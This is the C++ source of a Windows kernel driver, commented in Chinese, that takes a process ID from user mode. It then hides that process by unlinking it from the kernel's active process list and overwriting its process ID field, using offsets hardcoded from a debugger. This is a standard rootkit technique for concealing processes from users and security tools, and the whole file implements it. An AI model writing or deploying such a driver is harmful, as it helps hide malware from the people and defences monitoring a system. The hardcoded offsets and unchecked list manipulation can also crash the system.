#include <ntddk.h>

#define SYM_LINK_NAME L"\\??\\ProcessProtect"

// 这两个值来自 windbg 调试，不同 window 版本值不一样
#define PROCESS_ID_OFFSET 0x440
#define PROCESS_ACTIVE_LINKS_OFFSET 0x448

typedef NTSTATUS (*PSLOOKUPPROCESSBYPROCESSID)(HANDLE ProcessId,
                                               PEPROCESS* Process);

void DriverUnload(PDRIVER_OBJECT DriverObject);
NTSTATUS DriverWrite(PDEVICE_OBJECT DeviceObject, PIRP irp);
NTSTATUS DriverCreateOrClose(PDEVICE_OBJECT DeviceObject, PIRP irp);
ULONG ProtectProcess(PEPROCESS eProcess, ULONG pid = 0);
void HideProcess(PEPROCESS eProcess);
void RemoveListEntry(PLIST_ENTRY entry);

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject,
                                PUNICODE_STRING RegisterPath) {
  UNREFERENCED_PARAMETER(RegisterPath);

  UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\ProcessProtect");
  UNICODE_STRING symLinkName = RTL_CONSTANT_STRING(SYM_LINK_NAME);

  PDEVICE_OBJECT DeviceObj;
  NTSTATUS status = STATUS_SUCCESS;

  status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0,
                          false, &DeviceObj);

  if (!NT_SUCCESS(status)) {
    KdPrint(("Create device fail. status=(0x%X)\n", status));
    return status;
  }

  status = IoCreateSymbolicLink(&symLinkName, &devName);
  if (!NT_SUCCESS(status)) {
    KdPrint(("Create symbol link fail. status=(0x%X)\n", status));
    return status;
  }

  DriverObject->DriverUnload = DriverUnload;
  DriverObject->MajorFunction[IRP_MJ_CREATE] =
      DriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverCreateOrClose;
  DriverObject->MajorFunction[IRP_MJ_WRITE] = DriverWrite;

  DeviceObj->Flags |= DO_BUFFERED_IO;

  return status;
}

void DriverUnload(PDRIVER_OBJECT DriverObject) {
  IoDeleteDevice(DriverObject->DeviceObject);
  UNICODE_STRING symLinkName = RTL_CONSTANT_STRING(SYM_LINK_NAME);
  IoDeleteSymbolicLink(&symLinkName);
}

NTSTATUS DriverCreateOrClose(PDEVICE_OBJECT DeviceObject, PIRP irp) {
  UNREFERENCED_PARAMETER(DeviceObject);
  NTSTATUS status = STATUS_SUCCESS;
  irp->IoStatus.Status = status;
  irp->IoStatus.Information = 0;

  IoCompleteRequest(irp, IO_NO_INCREMENT);
  return status;
}

NTSTATUS DriverWrite(PDEVICE_OBJECT DeviceObject, PIRP irp) {
  UNREFERENCED_PARAMETER(DeviceObject);
  NTSTATUS status = STATUS_SUCCESS;
  ULONG pid = *((ULONG*)irp->AssociatedIrp.SystemBuffer);

  // 导出但未文档化的函数，按下面这样来用
  UNICODE_STRING str = RTL_CONSTANT_STRING(L"PsLookupProcessByProcessId");
  PSLOOKUPPROCESSBYPROCESSID PsLookupProcessByProcessId =
      (PSLOOKUPPROCESSBYPROCESSID)MmGetSystemRoutineAddress(&str);

  PEPROCESS eProcess = NULL;
  status = PsLookupProcessByProcessId((HANDLE)pid, &eProcess);
  if (!NT_SUCCESS(status)) {
    return status;
  }

  ProtectProcess(eProcess);
  HideProcess(eProcess);

  irp->IoStatus.Status = status;
  irp->IoStatus.Information = 0;
  IoCompleteRequest(irp, IO_NO_INCREMENT);

  return status;
}

// pid = 0 是保护进程，改成对应进程id，是取消保护
ULONG ProtectProcess(PEPROCESS eProcess, ULONG pid) {
  ULONG op = *((PULONG)((ULONG64)eProcess + PROCESS_ID_OFFSET));
  *((PULONG)((ULONG64)eProcess + PROCESS_ID_OFFSET)) = pid;

  return op;
}

// 隐藏进程
void HideProcess(PEPROCESS eProcess) {
  PLIST_ENTRY entry =
      (PLIST_ENTRY)((ULONG64)eProcess + PROCESS_ACTIVE_LINKS_OFFSET);
  RemoveEntryList(entry);
}

void RemoveListEntry(PLIST_ENTRY entry) {
  KIRQL OldIrql = KeRaiseIrqlToDpcLevel();

  if (entry->Flink != entry && entry->Blink != entry &&
      entry->Blink->Flink == entry && entry->Flink->Blink == entry) {
    entry->Flink->Blink = entry->Blink;
    entry->Blink->Flink = entry->Flink;
    entry->Flink = entry;
    entry->Blink = entry;
  }

  KeLowerIrql(OldIrql);
}